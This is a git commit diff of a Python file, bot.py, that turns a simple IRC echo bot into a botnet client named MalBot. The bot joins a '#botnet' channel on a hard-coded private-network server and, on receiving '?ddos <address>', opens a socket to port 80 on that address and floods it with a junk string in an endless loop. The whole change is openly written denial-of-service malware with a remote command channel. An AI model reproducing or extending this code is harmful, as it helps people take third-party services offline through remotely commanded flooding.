aff9da4b37d53d8d148f67199e378ac1c6a910e3
Arsala Bangash <arsalabangash@Arsalas-MacBook-Pro-2.local>
2018-02-05 10:20:59 -0500

    Fixed stupid git errors

--- bot.py
+++ bot.py
@@ -1,13 +1,32 @@
 import pydle
+import socket, sys
+
 
 # Simple echo bot.
 class MalBot(pydle.Client):
+
     def on_connect(self):
-         self.join('#botnet')
+        self.channel = "#botnet"
+        self.join(self.channel)
+
+    def on_join(self, channel, user):
+        super().on_join(channel, user)
+        self.message(channel, 'Joined botnet')
+
+    def attack(self, target):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, 80))
+        while True:
+            s.send(str.encode("I'm DDOSing your ass"))
+            print(">> GET /" + target + " HTTP/1.1")
 
     def on_message(self, source, target, message):
-         self.message(target, message)
+        if message.startswith("?ddos"):
+            address = message.split()[1]
+            self.message(self.channel, "Acknowledged request to DDOS {}".format(address))
+            self.attack(address)
+
 
 client = MalBot('MalBot', realname='MalBot')
-client.connect('192.168.67.130', 6697, tls=True, tls_verify=False)
+client.connect('192.168.67.130', 6697, tls=False, tls_verify=False, password="botnet")
 client.handle_forever()
